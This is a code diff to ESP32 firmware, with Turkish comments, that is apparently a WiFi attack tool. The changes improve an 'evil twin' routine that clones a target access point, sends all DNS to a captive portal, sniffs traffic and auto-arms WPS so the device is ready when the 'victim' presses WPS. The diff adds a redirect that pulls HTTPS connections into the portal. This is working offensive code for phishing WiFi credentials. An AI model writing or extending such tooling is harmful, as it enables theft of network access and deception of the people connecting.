@@ -7,6 +7,7 @@
 #include "passwords.h"
 #include "types.h"
 #include "web_interface.h"
+#include "https_redirect.h"
 
 // ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
 bool    evil_twin_active  = false;
@@ -412,20 +413,26 @@ void start_evil_twin(int wifi_number) {
   memcpy(et_frame.access_point, evil_twin_bssid, 6);
   memcpy(et_frame.sender,       evil_twin_bssid, 6);
 
-  // APSTA modu — hem sahte AP hem STA (şifre testi için)
-  WiFi.mode(WIFI_MODE_APSTA);
+  // APSTA modu — zaten APSTA'daysa WiFi.mode() çağrılmaz (WiFi stack'i sıfırlar, ~300ms ekler)
+  wifi_mode_t cur_mode = WIFI_MODE_NULL;
+  esp_wifi_get_mode(&cur_mode);
+  if (cur_mode != WIFI_MODE_APSTA) {
+    WiFi.mode(WIFI_MODE_APSTA);
+  }
   WiFi.setAutoReconnect(false);  // Auto-reconnect WPS'i bozar — devre dışı
   WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
 
-  // AP'nin tam başlamasını bekle — ardından TX gücünü uygula
-  // (Mode geçişi TX power'ı sıfırlar; gecikmesiz set etmek etkisiz kalır)
-  delay(150);
+  // AP'nin başlamasını bekle — mod değişimi olmadığında daha kısa süre yeterli
+  delay(cur_mode == WIFI_MODE_APSTA ? 80 : 150);
   apply_max_performance();
 
   // DNS: tüm sorguları 192.168.4.1'e yönlendir
   dns_server.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
 
   et_start_sniffer();
+
+  // HTTPS → HTTP yönlendirme (port 443) — TLS bağlantılarını captive portal'a çeker
+  https_redirect_start();
 
   // WPS PBC'yi otomatik başlat — kurban portaldaki WPS tuşuna bastığında
   // ESP32 hazır bekliyor olsun; manuel admin panel adımına gerek kalmasın.
@@ -600,6 +607,7 @@ void stop_evil_twin() {
 
   esp_wifi_set_promiscuous(false);
   dns_server.stop();
+  https_redirect_stop();
 
   WiFi.softAPdisconnect(true);
   delay(150);
